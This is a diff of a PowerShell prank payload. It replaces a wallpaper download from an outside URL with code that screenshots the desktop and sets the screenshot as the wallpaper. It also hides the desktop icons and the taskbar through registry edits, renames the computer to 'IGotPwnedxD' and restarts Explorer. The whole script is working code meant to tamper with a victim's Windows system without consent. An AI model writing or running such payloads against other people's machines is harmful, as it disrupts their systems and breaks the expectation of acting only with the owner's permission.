@@ -1,11 +1,26 @@
-$WallpaperUrl = "https://bin.spizza.cc/f.php?h=3Gs1IKNk&p=1&k=a7f57d3bb0f653ae278d1a977aa543f9"
 $TempPath = [System.IO.Path]::GetTempPath()
-$WallpaperPath = "$TempPath\wallpaper.jpg"
+$ScreenshotPath = "$TempPath\screenshot.jpg"
 
-# Download the wallpaper to temp folder
-Invoke-WebRequest -Uri $WallpaperUrl -OutFile $WallpaperPath
+# Create a Shell object
+$Shell = New-Object -ComObject Shell.Application
 
-# Set the wallpaper
+# Minimize all windows
+$Shell.MinimizeAll()
+
+# Small delay to allow minimize
+Start-Sleep -Milliseconds 500
+
+# Take a screenshot
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$ScreenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$Screenshot = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
+$Graphics = [Drawing.Graphics]::FromImage($Screenshot)
+$Graphics.CopyFromScreen($ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
+$Screenshot.Save($ScreenshotPath, [Drawing.Imaging.ImageFormat]::Jpeg)
+
+# Set the screenshot as wallpaper
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -15,6 +30,20 @@ public class Wallpaper {
     public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 }
 "@
+[Wallpaper]::SystemParametersInfo(0x0014, 0, $ScreenshotPath, 0x01 -bor 0x02)
 
-[Wallpaper]::SystemParametersInfo(0x0014, 0, $WallpaperPath, 0x01 -bor 0x02)
+# Hide all desktop icons
+$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
 
+# Rename computer
+Rename-Computer -NewName "IGotPwnedxD"
+
+# Hide Taskbar
+&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v}
+
+# Restart Explorer
+Get-Process "explorer"| Stop-Process
+
+# Restore all windows
+$Shell.UndoMinimizeAll()
